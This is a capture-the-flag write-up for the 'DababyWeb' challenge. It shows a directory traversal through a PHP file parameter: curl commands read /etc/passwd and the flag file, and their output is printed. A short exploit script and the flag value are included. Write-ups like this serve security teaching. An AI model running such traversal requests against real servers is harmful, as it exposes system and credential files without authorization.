# DababyWeb

Dababy wanted to share a message, but he seemed to put it too high up...

34.72.118.158:6284

Author: Darkfowl

## Challenge

We are given a website at `http://34.72.118.158:6284/` with links to 2 pages: `http://34.72.118.158:6284/fun.php` and `http://34.72.118.158:6284/fun1.php?file=suge`

The main page includes the text:

```
"Dababy has his secret message hidden somwhere, but how can we read it?" Dababy's Name Judgement

Dababy's Images
```

`fun.php` takes a string and returns "[First word] Is a Cool Name Lesss Go!".
Unless the string is too long, in which case it returns "Dababy says that's a long name".

`fun1.php` is filled with images, and includes the partially obscured text:

```
Pooh, you a fool for this one Ha Oh lord, Jetson made another one Hah Pack in the mail, it's gone (Uh) She like how I smell, cologne (Yeah) I just signed a deal, I'm on Yeah, yeah I go where I want Good, good Play if you want, let's do it (Ha) I'm a young CEO, Suge (Yeah) Yeah, yeah
```

## Solution

If we look at the second url: `http://34.72.118.158:6284/fun1.php?file=suge`, we can see that it specifies a file to read from:

```
-> % curl http://34.72.118.158:6284/fun1.php\?file\=suge
Pooh, you a fool for this one
Ha
Oh lord, Jetson made another one
Hah
Pack in the mail, it's gone (Uh)
She like how I smell, cologne (Yeah)
I just signed a deal, I'm on
Yeah, yeah
I go where I want
Good, good
Play if you want, let's do it (Ha)
I'm a young CEO, Suge (Yeah)
Yeah, yeah

<style type="text/css">
html, body{width: 100%; height: 100%; padding: 0; margin: 0}
div{position: absolute; padding: 0em; border: 1px solid #000}
#nw{top: 10%; left: 0; right: 50%; bottom: 50%}
#ne{top: 0; left: 50%; right: 0; bottom: 50%}
#sw{top: 50%; left: 0; right: 50%; bottom: 0}
#se{top: 50%; left: 50%; right: 0; bottom: 0}
</style>

<div id="nw"><img src="/img/dababy4.jpg" style="width:100%;height:100%;"></div>
<div id="ne"><img src="/img/dababy5.jpg" style="width:100%;height:100%;"></div>
<div id="sw"><img src="/img/dababy6.jpg" style="width:100%:height:100%;"></div>
<div id="se"><img src="/img/dababy7.png" style="width:100%:height:100%;"></div>
```

Let's try a directory traversal attack to read `/etc/passwd`:

```
-> % curl http://34.72.118.158:6284/fun1.php\?file\=../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

<style type="text/css">
html, body{width: 100%; height: 100%; padding: 0; margin: 0}
div{position: absolute; padding: 0em; border: 1px solid #000}
#nw{top: 10%; left: 0; right: 50%; bottom: 50%}
#ne{top: 0; left: 50%; right: 0; bottom: 50%}
#sw{top: 50%; left: 0; right: 50%; bottom: 0}
#se{top: 50%; left: 50%; right: 0; bottom: 0}
</style>

<div id="nw"><img src="/img/dababy4.jpg" style="width:100%;height:100%;"></div>
<div id="ne"><img src="/img/dababy5.jpg" style="width:100%;height:100%;"></div>
<div id="sw"><img src="/img/dababy6.jpg" style="width:100%:height:100%;"></div>
<div id="se"><img src="/img/dababy7.png" style="width:100%:height:100%;"></div>
```

Through some guesswork, we can find the `flag.txt` file one directory up from the `suge` file:

```
-> % curl http://34.72.118.158:6284/fun1.php\?file\=../flag.txt
RS{J3TS0N_M4D3_4N0TH3R_0N3}

<style type="text/css">
html, body{width: 100%; height: 100%; padding: 0; margin: 0}
div{position: absolute; padding: 0em; border: 1px solid #000}
#nw{top: 10%; left: 0; right: 50%; bottom: 50%}
#ne{top: 0; left: 50%; right: 0; bottom: 50%}
#sw{top: 50%; left: 0; right: 50%; bottom: 0}
#se{top: 50%; left: 50%; right: 0; bottom: 0}
</style>

<div id="nw"><img src="/img/dababy4.jpg" style="width:100%;height:100%;"></div>
<div id="ne"><img src="/img/dababy5.jpg" style="width:100%;height:100%;"></div>
<div id="sw"><img src="/img/dababy6.jpg" style="width:100%:height:100%;"></div>
<div id="se"><img src="/img/dababy7.png" style="width:100%:height:100%;"></div>
```

## Exploit

```bash
#!/usr/bin/bash

curl http://34.72.118.158:6284/fun1.php\?file\=../flag.txt
```

## Flag

`RS{J3TS0N_M4D3_4N0TH3R_0N3}`

